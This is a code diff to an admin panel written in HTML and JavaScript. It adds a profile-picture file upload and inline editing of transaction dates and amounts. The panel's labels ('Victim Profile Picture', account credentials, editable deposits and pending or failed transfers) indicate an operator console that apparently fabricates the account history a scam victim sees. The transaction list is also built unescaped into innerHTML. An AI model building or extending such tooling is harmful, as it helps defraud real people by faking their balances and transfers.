@@ -106,8 +106,8 @@
                 <!-- Profile Picture -->
                 <div class="settings-group">
                     <p><i class="fas fa-image"></i> Victim Profile Picture</p>
-                    <input type="text" id="adminProfilePic" placeholder="Image URL (e.g. https://...)">
-                    <button id="btnUpdateProfilePic">Update Profile Picture</button>
+                    <input type="file" id="adminProfilePicFile" accept="image/*" style="background:#151521; padding:8px; width:100%; color:white; border:1px solid #3a3a52; border-radius:4px; margin-bottom:8px;">
+                    <button id="btnUpdateProfilePic">Upload Profile Picture</button>
                     <div id="profilePicStatus" class="status-msg"></div>
                 </div>
 
@@ -384,12 +384,8 @@
             }
 
             
-            // Poll Profile Picture
+            // Poll Profile Picture (File input cannot be populated programmatically for security reasons, so we skip it)
             var pPic = getSyncItem('profilePic');
-            if (pPic && document.activeElement !== document.getElementById('adminProfilePic')) {
-                var adminPicEl = document.getElementById('adminProfilePic');
-                if(adminPicEl) adminPicEl.value = pPic;
-            }
 
             // Poll Account Credentials
             var acctUser = getSyncItem('acctUsername');
@@ -449,11 +445,19 @@
                     var color = tx.type === 'deposit' ? '#5cb85c' : (tx.status === 'failed' ? '#d9534f' : '#fff');
                     var sign = tx.type === 'deposit' ? '+' : '-';
                     var statStr = tx.status === 'pending' ? ' (Pending)' : (tx.status === 'failed' ? ' (Failed)' : '');
-                    txHtml += '<div style="background:#1e1e2d; padding:8px; margin-bottom:6px; border-radius:4px; display:flex; justify-content:space-between; align-items:center;">' +
-                        '<div><strong>' + tx.desc + '</strong>' + statStr + '<br><span style="color:#a0a0b8; font-size:11px;">' + tx.date + '</span></div>' +
-                        '<div style="display:flex; align-items:center; gap:8px;"><span style="color:' + color + '; font-weight:bold;">' + sign + tx.amount + '</span>' +
-                        '<button onclick="editTx(' + idx + ')" style="background:#3498db; color:white; border:none; border-radius:3px; padding:2px 6px; cursor:pointer; font-size:10px;">Edit</button>' +
-                        '<button onclick="removeTx(' + idx + ')" style="background:#d9534f; color:white; border:none; border-radius:3px; padding:2px 6px; cursor:pointer; font-size:10px;">X</button></div></div>';
+                    txHtml += '<div style="background:#1e1e2d; padding:8px; margin-bottom:6px; border-radius:4px; display:flex; flex-direction:column; gap:5px;">' +
+                        '<div style="display:flex; justify-content:space-between; align-items:center;">' +
+                            '<div><strong>' + tx.desc + '</strong>' + statStr + '</div>' +
+                            '<div style="display:flex; align-items:center; gap:8px;">' +
+                                '<button onclick="saveInlineTx(' + idx + ')" style="background:#5cb85c; color:white; border:none; border-radius:3px; padding:2px 6px; cursor:pointer; font-size:10px;">Save Inline</button>' +
+                                '<button onclick="removeTx(' + idx + ')" style="background:#d9534f; color:white; border:none; border-radius:3px; padding:2px 6px; cursor:pointer; font-size:10px;">X</button>' +
+                            '</div>' +
+                        '</div>' +
+                        '<div style="display:flex; gap:10px;">' +
+                            '<input type="text" id="inlineTxDate_' + idx + '" value="' + tx.date + '" placeholder="Date" style="flex:1; padding:4px; background:#151521; border:1px solid #3a3a52; color:white; border-radius:3px; font-size:11px;">' +
+                            '<input type="text" id="inlineTxAmount_' + idx + '" value="' + tx.amount + '" placeholder="Amount" style="flex:1; padding:4px; background:#151521; border:1px solid #3a3a52; color:' + color + '; font-weight:bold; border-radius:3px; font-size:11px;">' +
+                        '</div>' +
+                    '</div>';
                 });
                 document.getElementById('adminTxList').innerHTML = txHtml;
             } else {
@@ -693,14 +697,23 @@
         });
 
         
-        // Update Profile Picture
+        // Update Profile Picture (Upload)
         var btnUpdateProfilePic = document.getElementById('btnUpdateProfilePic');
         if (btnUpdateProfilePic) {
-            btnUpdateProfilePic.addEventListener('click', async function() {
-                var url = document.getElementById('adminProfilePic').value.trim();
-                if (url) await setSyncItem('profilePic', url);
-                document.getElementById('profilePicStatus').innerText = 'Profile picture updated!';
-                setTimeout(function(){ document.getElementById('profilePicStatus').innerText = ''; }, 3000);
+            btnUpdateProfilePic.addEventListener('click', function() {
+                var fileInput = document.getElementById('adminProfilePicFile');
+                if (fileInput.files && fileInput.files[0]) {
+                    var reader = new FileReader();
+                    reader.onload = async function(e) {
+                        var base64Image = e.target.result;
+                        await setSyncItem('profilePic', base64Image);
+                        document.getElementById('profilePicStatus').innerText = 'Profile picture uploaded and updated!';
+                        setTimeout(function(){ document.getElementById('profilePicStatus').innerText = ''; }, 3000);
+                    };
+                    reader.readAsDataURL(fileInput.files[0]);
+                } else {
+                    alert('Please select an image file to upload.');
+                }
             });
         }
 
